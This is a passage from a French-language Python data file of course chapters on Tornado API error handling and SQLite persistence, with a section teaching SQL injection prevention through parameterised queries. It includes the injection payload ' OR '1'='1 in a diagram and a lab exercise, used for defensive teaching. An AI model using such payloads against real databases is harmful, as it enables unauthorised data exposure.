                    "**`self.write_error(status_code, **kwargs)`**.\n\n"
                    "```python — Surcharge industrielle RFC 7807 de write_error dans BaseJSONHandler\n"
                    "class BaseJSONHandler(tornado.web.RequestHandler):\n"
                    "    def write_error(self, status_code: int, **kwargs) -> None:\n"
                    "        self.set_header(\"Content-Type\", \"application/problem+json; charset=UTF-8\")\n"
                    "        detail = self._reason  # Message officiel HTTP ou reason passé à HTTPError\n"
                    "        if status_code >= 500:\n"
                    "            detail = \"Une erreur interne est survenue. Communiquez le request_id au support.\"\n"
                    "        self.finish({\n"
                    "            \"type\": f\"https://httpstatuses.com/{status_code}\",\n"
                    "            \"title\": self._reason,\n"
                    "            \"status\": status_code,\n"
                    "            \"detail\": detail,\n"
                    "            \"instance\": self.request.path,\n"
                    "            \"request_id\": getattr(self, \"request_id\", None),\n"
                    "        })\n"
                    "```\n\n"
                    "> [!NOTE] Pourquoi `self.clear()` réappelle `set_default_headers()`\n"
                    "> Lorsque `send_error()` exécute `self.clear()` pour purger d'éventuels octets déjà écrits avant le "
                    "crash, Tornado réinvoque immédiatement `self.set_default_headers()`. C'est la raison pour laquelle vos "
                    "en-têtes CORS posés dans `set_default_headers()` restent présents même sur une erreur `500`, permettant "
                    "au frontal React de lire proprement le JSON d'erreur !"
                )
            },
            {
                "heading": "2. Capturer les Routes Inconnues (`404`) avec `default_handler_class` sur `Application`",
                "body": (
                    "Un piège subtil guette les développeurs Tornado : redéfinir `write_error()` sur `BaseJSONHandler` "
                    "convertit bien en JSON les erreurs `400`, `405` et `500` survenant sur vos routes déclarées, ainsi que "
                    "les `raise tornado.web.HTTPError(404)` levés manuellement lorsque l'ID `#999` manque en base. Mais que "
                    "se passe-t-il lorsqu'un client appelle `/api/v1/route-inexistante` qui ne correspond à **aucune "
                    "expression régulière** de votre table de routage ?\n\n"
                    "Par défaut, `tornado.web.Application` instancie alors sa classe interne `tornado.web.ErrorHandler(status_code=404)` "
                    "qui n'hérite pas de votre `BaseJSONHandler` et renvoie encore du HTML ! Pour fermer définitivement cette "
                    "brèche, on déclare une sous-classe `NotFoundJSONHandler(BaseJSONHandler)` dont `prepare(self)` lève "
                    "`raise tornado.web.HTTPError(404, reason=\"Route introuvable\")`, et on l'enregistre via "
                    "**`tornado.web.Application(routes, default_handler_class=NotFoundJSONHandler)`**."
                )
            },
            {
                "heading": "3. Cloisonnement de `exc_info` et Désactivation Impérative de `debug=True` en Production",
                "body": (
                    "Lorsqu'une exception `500` imprévue survient, Tornado transmet le triplet `(type, value, traceback)` dans "
                    "`kwargs[\"exc_info\"]` à `write_error()`. Pendant le développement local, activer `debug=True` (ou "
                    "`serve_traceback=True`) affiche la pile d'appels pour accélérer le diagnostic. En production exposée sur "
                    "Internet, divulguer un *Traceback* Python constitue une **fuite d'information critique (OWASP Security "
                    "Misconfiguration)** révélant les versions exactes de vos bibliothèques, les chemins système `/home/...` "
                    "et la structure de vos requêtes SQL.\n\n"
                    "En production (`debug=False`), `write_error()` journalise l'intégralité de `exc_info` en interne avec "
                    "`self.request_id`, mais ne retourne jamais au client qu'un message générique neutre accompagné de cet "
                    "identifiant de corrélation."
                )
            }
        ],
        "architecture_diagram": (
            "COMPORTEMENT PAR DÉFAUT DE TORNADO vs SURCHARGE WRITE_ERROR & DEFAULT_HANDLER_CLASS :\n\n"
            "  Client appelle GET /api/url-inconnue\n"
            "     |\n"
            "     +---> [Sans default_handler_class] ---> Renvoie \"<html><title>404: Not Found</title>\" ---> CRASH JSON.parse() Client !\n"
            "     |\n"
            "     +---> [Avec NotFoundJSONHandler]   ---> Appelle write_error(404) ---> {\"status\": 404, \"title\": \"Not Found\", ...}\n"
            "                                             (Content-Type: application/problem+json) ---> Géré proprement par le Client !"
        ),
        "reference_table": {
            "title": "Mécanismes Globaux de Gestion d'Erreurs dans une API Tornado",
            "headers": ["Mécanisme Tornado", "Déclencheur", "Information utile à inclure dans le JSON de retour"],
            "rows": [
                ["`raise tornado.web.HTTPError(400, reason=...)`", "Requête mal formée", "`status: 400`, `detail: \"Syntaxe de requête ou JSON invalide\"`"],
                ["`default_handler_class=NotFoundJSONHandler`", "URL inconnue (`404`)", "`status: 404`, `instance: self.request.path`, `detail: \"Route introuvable\"`"],
                ["`write_error(405)`", "Verbe HTTP non implémenté sur ce Handler", "`status: 405`, `method: self.request.method`, `detail: \"Méthode non autorisée\"`"],
                ["`write_error(500, exc_info=...)`", "Bug Python non intercepté (`500`)", "`status: 500`, `request_id: self.request_id` (sans Traceback !)"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Laisser `debug=True` actif dans `tornado.web.Application` sur un serveur exposé sur Internet",
                "good": "Toujours forcer `debug=False` en production et surcharger `write_error`",
                "why": "Le mode `debug=True` affiche la pile d'exécution complète (Traceback) en cas d'erreur 500, exposant la structure interne du code."
            },
            {
                "bad": "Surcharger `write_error` dans ses handlers mais oublier `default_handler_class` sur `Application`",
                "good": "Toujours configurer `default_handler_class=NotFoundJSONHandler` dans `tornado.web.Application`",
                "why": "Sans `default_handler_class`, les URLs qui ne matchent aucune regex sont traitées par le `ErrorHandler` interne de Tornado qui renvoie du HTML."
            }
        ],
        "practical_exercises": [
            "Exécutez `day_3/04_gestion_erreurs_globale.py` dans l'atelier ci-dessus pour vérifier que les scénarios `404`, `405` et `500` (`ZeroDivisionError`) restituent tous un corps JSON propre exempt de balises HTML.",
            "Interrogez `GET /api/sandbox/formations/999` depuis le Client HTTP et inspectez l'enveloppe JSON d'erreur retournée par Tornado."
        ]
    },

    # =========================================================================
    # JOUR 3 — CHAPITRE 3.4 : PERSISTANCE SQLITE3, ACID & INJECTIONS SQL
    # =========================================================================
    "d3-l4": {
        "context": (
            "Maintenir un catalogue dans une liste Python `FORMATIONS = [...]` souffre d'un vice rédhibitoire : la "
            "structure réside en mémoire vive volatile et demeure isolée à l'intérieur d'un seul processus. Au moindre "
            "redémarrage du démon Tornado ou déploiement multi-instances derrière Nginx, l'état s'évapore ou diverge "
            "entre les nœuds.\n\n"
            "La persistance durable et cohérente d'une API s'appuie sur un **Système de Gestion de Base de Données "
            "Relationnelle (SGBDR)** conforme aux garanties **ACID**. À travers le moteur C embarqué **`sqlite3`** de "
            "la bibliothèque standard Python, ce chapitre maîtrise le cycle transactionnel, l'éradication mathématique "
            "des **Injections SQL** par requêtes préparées (`?`), et la délégation non bloquante vers un pool de threads "
            "via **`IOLoop.current().run_in_executor()`**."
        ),
        "deep_sections": [
            {
                "heading": "1. Transactions ACID, Journalisation `WAL` et Fabrique `sqlite3.Row`",
                "body": (
                    "Un moteur relationnel conforme au modèle **ACID** garantit quatre invariants matériels : l'**Atomicité** "
                    "(une transaction comprenant plusieurs écritures réussit intégralement au `conn.commit()` ou est annulée "
                    "intégralement au `conn.rollback()` sans jamais laisser d'état intermédiaire corrompu), la **Cohérence** "
                    "(respect strict des contraintes `NOT NULL`, `UNIQUE`, `CHECK` et `FOREIGN KEY`), l'**Isolation** entre "
                    "transactions concurrentes, et la **Durabilité** sur support non volatil après synchronisation disque.\n\n"
                    "#### Optimiser SQLite pour un serveur Web avec `WAL` et `sqlite3.Row`\n\n"
                    "Sur une API Tornado, deux réglages transforment l'ergonomie et les performances de SQLite : activer le "
                    "mode **`PRAGMA journal_mode=WAL;`** (*Write-Ahead Logging*) autorise les lecteurs `SELECT` à s'exécuter "
                    "en parallèle d'une écriture `INSERT`/`UPDATE` sans verrouiller le fichier (`database is locked`), tandis "
                    "que configurer **`conn.row_factory = sqlite3.Row`** substitue aux tuples anonymes `(1, 'Tornado', 5)` des "
                    "enregistrements indexés par nom de colonne immédiatement convertibles en dictionnaire JSON via `dict(row)`."
                )
            },
            {
                "heading": "2. Anatomie d'une Injection SQL sur l'AST et Inviolabilité des Requêtes Préparées (`?`)",
                "body": (
                    "Pourquoi la concaténation `f\"SELECT * FROM formations WHERE salle = '{salle}'\"` constitue-t-elle une "
                    "vulnérabilité critique classée au sommet de l'OWASP ? Parce qu'elle mélange dans le **même canal textuel** "
                    "le code exécutable SQL et la donnée non fiable fournie par l'utilisateur. Si un attaquant transmet "
                    "`salle = \"' OR '1'='1\"`, l'analyseur lexical de SQLite découvre une apostrophe fermante prématurée "
                    "suivie de l'opérateur logique `OR` : l'arbre syntaxique abstrait (*AST*) de la requête est réécrit et la "
                    "condition devient universellement vraie, exfiltrant 100 % des lignes de la table !\n\n"
                    "```python — Séparation physique Compilation AST / Liaison Binaire en DB-API 2.0\n"
                    "# 1. Le moteur C compile sqlite3_prepare_v2() sur un squelette SQL immuable :\n"
                    "cur = conn.execute(\n"
                    "    \"SELECT id, titre, duree_jours, salle FROM formations WHERE salle = ?\",\n"
                    "    (salle,)  # Notez la virgule obligatoire du tuple à 1 élément !\n"
                    ")\n"
                    "# 2. sqlite3_bind_text() injecte la valeur dans le slot #1 APRES compilation de l'AST.\n"
                    "```\n\n"
                    "Avec le marqueur positionnel `?` (ou nommé `:salle`), l'arbre syntaxique de l'ordre SQL est compilé et "
                    "scellé **avant même que SQLite n'examine les octets de `salle`**. L'entrée `\"' OR '1'='1\"` est "
                    "simplement comparée caractère pour caractère au nom d'une salle littérale, retournant `0` ligne : "
                    "l'injection SQL devient mathématiquement impossible."
                )
            },
            {
                "heading": "3. Contraintes `IntegrityError` (`409`) et Délégation Non Bloquante `run_in_executor` sur l'`IOLoop`",
                "body": (
                    "Lorsqu'une insertion viole une contrainte `UNIQUE` (doublon de matricule ou d'e-mail), SQLite lève "
                    "`sqlite3.IntegrityError`. Un `RequestHandler` soigné intercepte explicitement cette exception pour "
                    "émettre `conn.rollback()` et restituer un code métier **`409 Conflict`** au lieu d'une erreur `500`.\n\n"
                    "#### Préserver la fluidité de l'`IOLoop` face aux entrées-sorties disque synchrones\n\n"
                    "En architecture Tornado avancée, une question cruciale se pose : le module standard `sqlite3` (tout comme "
                    "`psycopg2` ou un calcul intensif) effectue des appels système disque **bloquants**. Si une requête SQL "
                    "complexe dure 25 millisecondes sur disque, l'exécuter directement dans `def get(self)` bloque l'`IOLoop` "
                    "pendant 25 ms. Comment exécuter du SQL synchrone sans jamais figer la boucle d'événements ? Tornado "
                    "fournit la passerelle native **`await tornado.ioloop.IOLoop.current().run_in_executor(None, fonction_sql, *args)`**, "
                    "qui déporte l'opération bloquante vers le `ThreadPoolExecutor` d'arrière-plan tout en laissant l'`IOLoop` "
                    "libre de servir des milliers d'autres sockets !\n\n"
                    "```python — Déporter une transaction SQLite synchrone hors du thread de l'IOLoop\n"
                    "class FormationsAsyncSqlHandler(tornado.web.RequestHandler):\n"
                    "    async def get(self) -> None:\n"
                    "        loop = tornado.ioloop.IOLoop.current()\n"
                    "        # Exécute lire_formations_sqlite() dans un thread worker sans bloquer epoll :\n"
                    "        lignes = await loop.run_in_executor(None, lire_formations_sqlite)\n"
                    "        self.write({\"total\": len(lignes), \"data\": lignes})\n"
                    "```"
                )
            }
        ],
        "architecture_diagram": (
            "COMPARAISON : CONCATÉNATION VULNÉRABLE vs REQUÊTE PARAMÉTRÉE SÉCURISÉE (?)\n\n"
            "  Entrée malveillante du client : salle = \"' OR '1'='1\"\n"
            "        |\n"
            "        +---> [DANGER : f\"SELECT * FROM formations WHERE salle = '{salle}'\"]\n"
            "        |     Le parseur SQL voit : WHERE salle = '' OR '1'='1'  ---> FUITE TOTALE DE LA BASE !\n"
            "        |\n"
            "        +---> [SÉCURISÉ : execute(\"SELECT * FROM formations WHERE salle = ?\", (salle,))]\n"
            "              Le moteur SQL cherche littéralement une salle nommée \"' OR '1'='1\" ---> 0 résultat (Attaque neutralisée !)"
        ),
        "reference_table": {
            "title": "Correspondance Opérations CRUD ↔ Méthodes Tornado ↔ Commandes SQL Paramétrées",
            "headers": ["Opération CRUD", "Route & Méthode Tornado", "Requête SQLite Paramétrée (`sqlite3`)", "Méthode de lecture résultat"],
            "rows": [
                ["**Create** (Créer)", "`POST /api/formations` (`def post`)", "`cur.execute(\"INSERT INTO formations (titre, salle) VALUES (?, ?)\", (t, s))` + `conn.commit()`", "`new_id = cur.lastrowid`"],
                ["**Read All** (Lister)", "`GET /api/formations` (`def get`)", "`conn.execute(\"SELECT * FROM formations LIMIT ? OFFSET ?\", (limit, offset))`", "`[dict(r) for r in cur.fetchall()]`"],
                ["**Read One** (Lire 1)", "`GET /api/formations/([0-9]+)` (`def get`)", "`conn.execute(\"SELECT * FROM formations WHERE id = ?\", (id,))`", "`row = cur.fetchone()` (`404` si `None`)"],
                ["**Update** (Modifier)", "`PUT /api/formations/([0-9]+)` (`def put`)", "`conn.execute(\"UPDATE formations SET titre = ?, salle = ? WHERE id = ?\", (t, s, id))` + `conn.commit()`", "`cur.rowcount`"],
                ["**Delete** (Supprimer)", "`DELETE /api/formations/([0-9]+)` (`def delete`)", "`conn.execute(\"DELETE FROM formations WHERE id = ?\", (id,))` + `conn.commit()`", "`200 OK` ou `204 No Content`"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Oublier la virgule dans un tuple à 1 seul élément : `conn.execute(\"... WHERE id = ?\", (formation_id))`",
                "good": "Toujours mettre la virgule : `conn.execute(\"... WHERE id = ?\", (formation_id,))`",
                "why": "En Python, `(5)` sans virgule est juste l'entier `5` entre parenthèses, alors que `(5,)` avec virgule est un tuple de 1 élément requis par `sqlite3`."
            },
            {
                "bad": "Oublier `conn.commit()` après un `INSERT`, `UPDATE` ou `DELETE`",
                "good": "Appeler systématiquement `conn.commit()` avant `conn.close()` lors d'une écriture",
                "why": "Sans `conn.commit()`, SQLite annule automatiquement toutes les modifications non validées à la fermeture de la connexion !"
            }
        ],
        "practical_exercises": [
            "Ouvrez l'onglet **SQLite & Requêtes Préparées** du laboratoire pour éprouver en direct la charge d'injection `\"Salle A' OR '1'='1\"` face à une concaténation vulnérable puis face au marqueur préparé `?`.",
            "Enchaînez le cycle transactionnel complet `POST` -> `PUT` -> `GET` sur `/api/sandbox/formations` depuis le **Client HTTP** et vérifiez la persistance effective en base SQLite."
        ]
    }
}
